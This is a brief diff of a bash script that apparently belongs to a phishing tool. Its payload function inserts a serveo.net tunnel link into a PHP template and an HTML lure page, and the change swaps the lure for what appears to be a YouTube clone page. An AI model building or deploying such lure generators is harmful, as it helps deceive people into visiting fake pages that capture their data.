@@ -136,7 +136,7 @@ booble
 payload() {
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-sed 's+forwarding_link+'$link'+g' boobleshooter.html > index3.html
+sed 's+forwarding_link+'$link'+g' youtubeclone.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 rm -rf index3.html
 }
